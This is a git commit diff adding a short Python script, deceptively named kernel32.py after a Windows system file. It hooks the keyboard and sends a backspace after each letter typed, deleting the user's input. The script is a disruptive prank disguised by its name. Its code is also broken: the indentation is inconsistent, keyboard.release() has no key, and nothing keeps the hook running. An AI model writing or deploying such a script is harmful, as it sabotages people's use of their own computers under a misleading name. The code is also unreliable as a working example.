673c88c6b562e996910ae4d4bfc8aad0e9d241e7
AeternusSomniafonsConcordiae <166434698+AeternusSomniafonsConcordiae@users.noreply.github.com>
2025-05-10 23:30:33 +0200

    Add main script via upload

---
+++ kernel32.py
@@ -0,0 +1,11 @@
+import keyboard
+
+def on_key_press(event):
+	# Monitor key presses
+    if event.name.isalpha():
+        keyboard.send('backspace')  # Delete the key
+    if event.name in ['shift', 'ctrl', 'alt']:
+    	keyboard.release()
+
+# Hook keyboard events
+keyboard.on_press(on_key_press)
